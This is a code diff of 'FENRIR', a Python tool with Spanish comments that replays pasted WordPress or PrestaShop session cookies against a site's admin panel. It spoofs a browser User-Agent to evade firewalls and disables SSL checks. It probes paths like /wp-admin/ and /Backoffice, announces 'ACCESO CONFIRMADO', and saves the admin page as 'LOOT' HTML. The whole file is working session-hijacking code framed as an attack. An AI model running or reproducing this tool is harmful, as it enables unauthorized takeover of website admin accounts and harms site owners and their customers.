@@ -1,51 +1,34 @@
 import asyncio
 import aiohttp
-import base64
-import json
 import sys
 import re
 import time
 import logging
 from dataclasses import dataclass
-from typing import List, Optional, Dict, Any
+from typing import Optional
 from enum import Enum, auto
-from http.cookies import SimpleCookie
 from yarl import URL
 
 # ==============================================================================
-#  🛠️ CONFIGURACIÓN & UTILS (ARCHITECT LEVEL)
+#  🛠️ CONFIGURACIÓN & UTILS (BRUTE FORCE PARSER)
 # ==============================================================================
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s %(message)s", datefmt="%H:%M:%S")
-logger = logging.getLogger("FENRIR")
-
 class Colors:
-    RED = "\033[91m"
-    GREEN = "\033[92m"
-    YELLOW = "\033[93m"
-    CYAN = "\033[96m"
-    RESET = "\033[0m"
-    BOLD = "\033[1m"
+    RED, GREEN, YELLOW, CYAN, RESET, BOLD = "\033[91m", "\033[92m", "\033[93m", "\033[96m", "\033[0m", "\033[1m"
 
-def colorize(text: str, color: str) -> str:
-    return f"{color}{text}{Colors.RESET}"
+def colorize(text: str, color: str) -> str: return f"{color}{text}{Colors.RESET}"
 
 class TargetType(Enum):
     WORDPRESS = auto()
     PRESTASHOP = auto()
-    GENERIC = auto()
 
 @dataclass
 class TargetConfig:
     base_url: str
     type: TargetType
-    # Usamos User-Agent de Chrome legítimo para evitar bloqueo de Firewall
-    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    user_agent: str
     timeout: int = 20
-
-# ==============================================================================
-#  🐺 CORE ENGINE: FENRIR (SNIPER MODE)
-# ==============================================================================
 
 class FenrirEngine:
     def __init__(self, config: TargetConfig):
@@ -54,156 +37,143 @@ class FenrirEngine:
 
     async def __aenter__(self):
         jar = aiohttp.CookieJar(unsafe=True)
-        connector = aiohttp.TCPConnector(ssl=False)
-        
         self.session = aiohttp.ClientSession(
             base_url=self.config.base_url,
-            connector=connector,
+            connector=aiohttp.TCPConnector(ssl=False),
             cookie_jar=jar,
             headers={"User-Agent": self.config.user_agent},
             timeout=aiohttp.ClientTimeout(total=self.config.timeout)
         )
         return self
 
-    async def __aexit__(self, exc_type, exc_val, exc_tb):
+    async def __aexit__(self, *args):
         if self.session: await self.session.close()
 
     def inject_raw_cookie(self, raw_cookie: str):
         if not self.session: return
-        print(colorize("💉 Inyectando Cookies...", Colors.YELLOW))
-        
+        print(colorize("\n💉 Inyectando Cookies a la fuerza...", Colors.YELLOW))
         try:
             url_obj = URL(self.config.base_url)
-            cookie = SimpleCookie()
-            raw_cookie = raw_cookie.replace("Cookie: ", "").strip()
             
-            if "=" not in raw_cookie:
-                print(colorize("⚠️ ERROR CRÍTICO: Formato incorrecto. Copia 'Nombre=Valor'.", Colors.RED))
-                print(f"   {Colors.CYAN}Ejemplo: PrestaShop-a8b...=def502...{Colors.RESET}")
-                return
+            # --- PARSER MANUAL (FUERZA BRUTA) ---
+            # Ignoramos SimpleCookie porque a veces falla con strings largos
+            raw_cookie = raw_cookie.strip().replace("Cookie: ", "")
+            
+            # Separamos múltiples cookies por ; si existen
+            parts = raw_cookie.split(";")
+            loaded_cookies = []
 
-            cookie.load(raw_cookie)
+            for part in parts:
+                if "=" in part:
+                    # Partimos solo en el primer '=' para respetar el valor
+                    key, value = part.strip().split("=", 1)
+                    self.session.cookie_jar.update_cookies({key: value}, response_url=url_obj)
+                    loaded_cookies.append(key)
             
-            for key, morsel in cookie.items():
-                self.session.cookie_jar.update_cookies({key: morsel.value}, response_url=url_obj)
-            
-            print(colorize(f"✅ Cookies cargadas: {list(cookie.keys())}", Colors.GREEN))
-            
+            if loaded_cookies:
+                print(colorize(f"✅ Cookies cargadas: {loaded_cookies}", Colors.GREEN))
+            else:
+                print(colorize("❌ ERROR: No se detectó formato Nombre=Valor.", Colors.RED))
+
         except Exception as e:
-            print(colorize(f"❌ Error inyectando cookies: {e}", Colors.RED))
+            print(colorize(f"❌ Error crítico: {e}", Colors.RED))
 
-    async def fuzz_endpoints(self, wordlist: List[str]):
-        print(colorize(f"\n🐕 RASTREANDO ({self.config.type.name}) - MODO PRECISIÓN...", Colors.BOLD))
-        tasks = [self._check_endpoint(path) for path in wordlist]
-        await asyncio.gather(*tasks)
-
-    async def _check_endpoint(self, path: str):
+    async def check_target(self, path: str):
         if not self.session: return
         try:
-            print(f"⏳ Verificando: {path} ...")
+            print(f"\n⏳ Atacando objetivo: {colorize(path, Colors.BOLD)} ...")
             
             async with self.session.get(path, allow_redirects=True) as resp:
                 content = await resp.text()
-                
-                # --- TELEMETRÍA ---
                 title_match = re.search('<title>(.*?)</title>', content, re.IGNORECASE)
-                page_title = title_match.group(1).strip() if title_match else "Sin Título"
+                title = title_match.group(1).strip() if title_match else "Sin Título"
                 
-                status_color = Colors.GREEN if resp.status == 200 else Colors.YELLOW
-                if resp.status >= 400: status_color = Colors.RED
-
-                print(f"   [{colorize(str(resp.status), status_color)}] URL Real: {resp.url}")
-                print(f"   📄 Título: {colorize(page_title[:60], Colors.CYAN)}...")
-
-                # --- VALIDACIÓN CONTEXTUAL ---
-                is_valid = False
+                real_url = str(resp.url)
+                status = resp.status
                 
-                if self.config.type == TargetType.WORDPRESS:
-                    # Fallo si vamos al login
-                    if "wp-login.php" in str(resp.url) or "Log In" in content:
-                        print(colorize("   ❌ FALLO: Rebote al Login (Cookie inválida).", Colors.RED))
-                        return
-                    # Éxito si vemos dashboard
-                    success_keys = ["wp-admin-bar", "Howdy", "Hola,", "Cerrar sesión", "Log Out", "Escritorio", "Dashboard"]
-                    if any(k in content for k in success_keys):
-                        is_valid = True
+                print(f"   [{status}] URL Final: {real_url}")
+                print(f"   📄 Título: {title[:60]}...")
 
-                elif self.config.type == TargetType.PRESTASHOP:
-                    # Fallo si vamos al login
-                    if "login" in str(resp.url).lower() and "AdminLogin" not in path:
-                        print(colorize("   ❌ FALLO: Rebote al Login.", Colors.RED))
-                        return
-                    
-                    # Éxito si vemos elementos de admin
-                    ps_keys = ["logout", "employee_box", "PrestaShop", "Cerrar sesión", "Avatar", "class=\"bootstrap\""]
-                    if any(k in content for k in ps_keys):
-                        is_valid = True
-
-                # --- RESULTADO ---
-                if is_valid:
-                    print(f"   {colorize('🔥 ¡BOOM! ACCESO CONFIRMADO', Colors.GREEN)}")
-                    filename = f"loot_{int(time.time())}.html"
-                    with open(filename, "w", encoding="utf-8") as f: f.write(content)
-                    print(f"   💾 Evidencia guardada en '{filename}'")
+                is_success = False
                 
-                elif resp.status == 200:
-                    print(colorize("   ⚠️  200 OK pero no parece Admin (¿Redirección a Home?).", Colors.YELLOW))
-                    with open("debug_fail.html", "w", encoding="utf-8") as f: f.write(content)
+                # PRESTASHOP LOGIC
+                if self.config.type == TargetType.PRESTASHOP:
+                    if "login" not in real_url.lower() and any(k in content for k in ["logout", "employee_box", "PrestaShop", "Avatar", "class=\"bootstrap\""]):
+                         is_success = True
+                    elif "login" in real_url.lower() and "AdminLogin" not in path:
+                         print(colorize("❌ REBOTE: El servidor te mandó al Login.", Colors.RED))
 
-        except Exception as e:
-            print(f"❌ Error de conexión: {e}")
+                # WORDPRESS LOGIC
+                elif self.config.type == TargetType.WORDPRESS:
+                    # Si no estamos en wp-login y vemos el admin bar
+                    if "wp-login.php" not in real_url and ("wp-admin" in real_url or "wp-admin-bar" in content):
+                        is_success = True
+                    elif "wp-login.php" in real_url:
+                         print(colorize("❌ REBOTE: El servidor te mandó al Login.", Colors.RED))
 
-# ==============================================================================
-#  🏁 MAIN ENTRY POINT
-# ==============================================================================
+                if is_success:
+                     print(f"\n   {colorize('🔥 ¡DENTRO! ACCESO CONFIRMADO 🔥', Colors.GREEN)}")
+                     filename = f"LOOT_{int(time.time())}.html"
+                     with open(filename, "w", encoding="utf-8") as f: f.write(content)
+                     print(f"   💾 Evidencia guardada en: {filename}")
+                else:
+                     if not "REBOTE" in title: 
+                        print(colorize("⚠️  Sin acceso claro (Revisa el HTML).", Colors.YELLOW))
+
+        except Exception as e: print(f"❌ Error de conexión: {e}")
 
 async def main():
-    print(colorize("\n🐺 FENRIR v3.3 - SNIPER EDITION 🐺\n", Colors.RED))
+    print(colorize("\n🦍 FENRIR v3.6 - BRUTE FORCE PARSER 🦍\n", Colors.RED))
 
-    # 1. URL Base (Solo la raíz)
-    base_input = input(">> URL Base (Raíz, ej: https://web.com): ").strip()
-    if not base_input.startswith("http"): base_input = f"http://{base_input}"
-    if not base_input.endswith("/"): base_input += "/"
+    # 1. URL
+    url_input = input(">> URL Base (Raíz): ").strip()
+    if not url_input.startswith("http"): url_input = f"http://{url_input}"
+    if not url_input.endswith("/"): url_input += "/"
     
-    # 2. Tecnología (Para saber qué buscar en el HTML)
+    # 2. TECNOLOGÍA
     print("\n[1] WordPress")
     print("[2] PrestaShop")
-    t_choice = input(">> Tecnología Objetivo: ").strip()
-    t_type = TargetType.WORDPRESS if t_choice == '1' else TargetType.PRESTASHOP
+    choice = input(">> Opción: ").strip()
+    target_type = TargetType.WORDPRESS if choice == '1' else TargetType.PRESTASHOP
+
+    # 3. COOKIE INPUT
+    final_cookie_string = ""
+    print(f"\n{Colors.YELLOW}👉 INYECCIÓN DE COOKIES{Colors.RESET}")
     
-    config = TargetConfig(base_url=base_input, type=t_type)
+    if target_type == TargetType.PRESTASHOP:
+        print("   [1] PHPSESSID (ej: 6vbgf3...):")
+        phpsessid = input("   >> ").strip()
+        print("   [2] PrestaShop Cookie (Nombre=Valor completo):")
+        auth = input("   >> ").strip()
+        
+        # Ensamblaje manual
+        prefix = f"PHPSESSID={phpsessid}" if "=" not in phpsessid else phpsessid
+        final_cookie_string = f"{prefix}; {auth}"
+        
+    else: # WordPress
+        print("   Pega la cookie 'wordpress_logged_in' completa (Nombre=Valor):")
+        final_cookie_string = input("   >> ").strip()
 
+    # 4. USER AGENT
+    print(f"\n{Colors.CYAN}🎭 CAMUFLAJE{Colors.RESET}")
+    print("   [Enter] para Firefox Linux.")
+    ua_input = input(">> User-Agent: ").strip()
+    if not ua_input: ua_input = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
+
+    # 5. RUTA
+    print(f"\n{Colors.GREEN}🎯 OBJETIVO{Colors.RESET}")
+    default_path = "/Backoffice" if target_type == TargetType.PRESTASHOP else "/wp-admin/"
+    print(f"   [Enter] para: {default_path}")
+    path_input = input(">> Ruta: ").strip()
+    if not path_input: path_input = default_path
+    if not path_input.startswith("/") and not path_input.startswith("http"): path_input = f"/{path_input}"
+
+    # GO
+    config = TargetConfig(base_url=url_input, type=target_type, user_agent=ua_input)
     async with FenrirEngine(config) as engine:
-        # 3. Cookie (La llave maestra)
-        print(f"\n{Colors.YELLOW}👉 INYECCIÓN DE COOKIE (Formato: Nombre=Valor){Colors.RESET}")
-        raw = input(">> Cookie String: ").strip()
-        engine.inject_raw_cookie(raw)
-
-        # 4. RUTA ESPECÍFICA (SNIPER INPUT)
-        print(f"\n{Colors.CYAN}🎯 CONFIGURACIÓN DE OBJETIVO{Colors.RESET}")
-        print("   Escribe la ruta exacta del admin (ej: /Backoffice, /wp-admin).")
-        print("   Deja en blanco para usar lista automática.")
-        custom_path = input(">> Ruta Específica: ").strip()
-
-        wordlist = []
-        if custom_path:
-            # Si el usuario pone una ruta, solo atacamos esa
-            if not custom_path.startswith("/") and not custom_path.startswith("http"):
-                 custom_path = f"/{custom_path}" # Fix slash
-            wordlist = [custom_path]
-        else:
-            # Fallback a listas automáticas
-            if t_type == TargetType.WORDPRESS:
-                wordlist = ["wp-admin/", "wp-admin/index.php"]
-            else:
-                wordlist = ["admin", "backoffice", "dashboard", "adm", "Backoffice"] # Añadida Backoffice mayúscula
-
-        await engine.fuzz_endpoints(wordlist)
+        engine.inject_raw_cookie(final_cookie_string)
+        await engine.check_target(path_input)
 
 if __name__ == "__main__":
-    try:
-        if sys.platform == 'win32': 
-            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
-        asyncio.run(main())
-    except KeyboardInterrupt:
-        print("\n👋 Abortado.")
+    if sys.platform == 'win32': asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
+    asyncio.run(main())
